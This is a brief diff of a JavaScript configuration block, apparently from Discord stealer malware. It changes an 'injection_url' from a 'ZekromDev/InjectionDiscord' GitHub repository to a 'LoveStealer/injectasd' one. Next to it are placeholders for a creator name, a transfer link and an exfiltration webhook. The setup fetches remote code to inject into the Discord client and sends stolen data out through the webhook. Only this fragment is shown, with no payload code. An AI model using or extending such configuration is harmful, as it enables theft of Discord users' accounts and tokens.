@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/ZekromDev/InjectionDiscord/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/LoveStealer/injectasd/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
